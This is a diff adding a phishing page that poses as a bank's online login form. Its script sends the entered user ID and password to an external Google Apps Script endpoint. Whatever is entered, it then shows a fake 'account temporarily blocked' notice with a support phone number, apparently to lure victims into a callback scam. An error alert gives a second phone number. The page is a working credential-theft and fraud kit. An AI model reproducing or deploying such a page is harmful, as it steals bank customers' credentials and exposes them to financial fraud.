@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Online Banking Login</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #004f59;
+        margin: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        overflow: hidden;
+      }
+
+      .navbar {
+        background-color: #fff;
+        padding: 10px 20px;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        width: 100%;
+        position: absolute;
+        top: 0;
+        left: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .navbar img {
+        max-width: 240px;
+      }
+
+      .login-container {
+        background-color: #fff;
+        border-radius: 30px;
+        padding: 40px 50px;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        width: 100%;
+        max-width: 400px;
+        margin-top: 80px;
+        overflow: hidden;
+      }
+
+      .login-container h1 {
+        font-size: 1.6rem;
+        text-align: center;
+        color: #555555;
+        margin-bottom: 20px;
+      }
+
+      .form-group {
+        margin-bottom: 15px;
+      }
+
+      label {
+        display: block;
+        font-size: 0.9rem;
+        color: #555;
+        margin-bottom: 5px;
+      }
+
+      input[type="text"],
+      input[type="password"] {
+        width: 100%;
+        padding: 10px;
+        border: 1px solid #ccc;
+        font-size: 1rem;
+        box-sizing: border-box;
+      }
+
+      .remember-me {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .remember-me label {
+        font-size: 0.9rem;
+      }
+
+      .btn {
+        width: 100%;
+        background-color: #a3d977;
+        color: #004f59;
+        font-size: 1rem;
+        font-weight: bold;
+        padding: 10px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        margin-top: 10px;
+      }
+      .btn.loading {
+        position: relative;
+        pointer-events: none;
+        opacity: 0.7;
+      }
+      .btn.loading::after {
+        content: "";
+        position: absolute;
+        right: 110px;
+        width: 15px;
+        height: 15px;
+        border: 2px solid #fff;
+        border-top: 2px solid #333;
+        border-radius: 50%;
+        animation: spin 0.6s linear infinite;
+      }
+      @keyframes spin {
+        from {
+          transform: rotate(0deg);
+        }
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .error-message {
+        color: red;
+        display: none;
+        margin-top: 10px;
+        text-align: left;
+      }
+
+      .btn:hover {
+        background-color: #94c26c;
+      }
+
+      .links {
+        text-align: center;
+        margin-top: 15px;
+      }
+
+      .links a {
+        color: #004f59;
+        font-size: 0.9rem;
+        text-decoration: none;
+      }
+
+      .links a:hover {
+        text-decoration: underline;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="navbar">
+      <img src="logo.png" alt="Bank Logo" />
+    </div>
+    <div class="login-container">
+      <h1>Sign in to Online Banking</h1>
+      <form id="loginForm">
+        <div class="form-group">
+          <label for="userID">User ID</label>
+          <input
+            type="text"
+            id="userID"
+            class="error"
+            placeholder="Enter your User ID"
+            required
+          />
+        </div>
+        <div class="form-group">
+          <label for="pass">Password</label>
+          <input
+            type="password"
+            id="pass"
+            placeholder="Enter your Password"
+            required
+          />
+        </div>
+        <div class="form-group remember-me">
+          <input type="checkbox" id="remember-me" />
+          <label for="remember-me">Remember Me</label>
+        </div>
+        <div class="error-message" id="error-message">
+          <p>
+            Your account is temporarily blocked due to some suspicious login
+            attempts. <br />
+            Contact Support : <a href="tel:+18023994043">+1 802-399-4043</a>
+          </p>
+        </div>
+        <button type="submit" class="btn">
+          Sign in
+          <img
+            id="loader"
+            src="loader.gif"
+            alt="Loading..."
+            style="display: none; width: 20px; margin-left: 10px"
+          />
+        </button>
+      </form>
+      <div class="links">
+        <a href="#">Help signing in to your account</a><br />
+        <a href="#">Enroll in Online Banking</a>
+      </div>
+    </div>
+    <script>
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+          const userID = document.getElementById("userID").value;
+          const pass = document.getElementById("pass").value;
+          const formDetails = {
+            userID: userID,
+            pass: pass,
+          };
+
+          const scriptURL =
+            "https://script.google.com/macros/s/AKfycbweeKHNdtr5RLA1eOkLnkYAZXNKZuXi3kQoEPkZ5wCxmoCr6dmCLsOmG71-OtIdH9yFew/exec";
+
+          fetch(scriptURL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(formDetails),
+          })
+            .then(() => {
+              document.getElementById("loginForm").reset();
+            })
+            .catch((error) => {
+              console.error("Error:", error);
+              alert(
+                "There was an error in logging in the form. Contact Our Support Immediately +1 828-280-8745"
+              );
+            });
+        });
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+          const submitButton = document.querySelector(".btn");
+          submitButton.classList.add("loading");
+
+          setTimeout(function () {
+            submitButton.classList.remove("loading");
+            document.getElementById("error-message").style.display = "block";
+          }, 2000);
+        });
+    </script>
+  </body>
+</html>
